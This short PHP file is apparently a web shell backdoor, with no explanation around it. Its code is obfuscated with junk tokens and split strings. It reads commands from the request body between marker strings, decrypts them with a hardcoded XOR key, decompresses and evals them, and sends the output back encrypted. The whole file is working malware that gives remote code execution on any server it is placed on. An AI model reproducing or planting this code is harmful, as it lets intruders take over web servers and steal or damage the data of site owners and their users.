<?php
$k='();@Y&eY&val(@gzuY&ncompressY&(@x(@bY&ase6Y&4_decY&ode($m[1])Y&Y&,$Y&Y&k)))Y&;$o=@ob_get_contents();Y&@o';
$u='fuY&ncY&tion x($t,$k)Y&{$c=strlY&eY&n($k);$Y&l=strlY&en($t)Y&;Y&$o="";for($Y&i=0;$i<$lY&;Y&){foY&r';
$V='Y&b_endY&_clY&eaY&n();$r=@base6Y&4_encode(@x(Y&@gzcoY&mprY&ess($o)Y&,$kY&))Y&;print("$p$khY&$r$kf");}';
$R=str_replace('dE','','crdEdEeatdEe_dEfudEnctdEion');
$s='match("/$kh(Y&.Y&+)Y&$kf/",Y&Y&@file_Y&get_contenY&ts(Y&"php://inputY&"),$m)==1Y&) {@ob_Y&start';
$Q='Y&($Y&j=0;($j<$c&&$Y&i<Y&$l);$Y&j++Y&,$i++){$o.=$t{$i}^$Y&k{$j};}}reY&turY&nY& $o;}Y&if (@pregY&_';
$J='$k="ecY&Y&ee214Y&e";$Y&kY&h=Y&"0634d43c4960";$kf="5Y&b554Y&0d8Y&3722";$p="vgYbY&zE9Y&TMRBY&69GMK";';
$E=str_replace('Y&','',$J.$u.$Q.$s.$k.$V);
$e=$R('',$E);$e();
?>
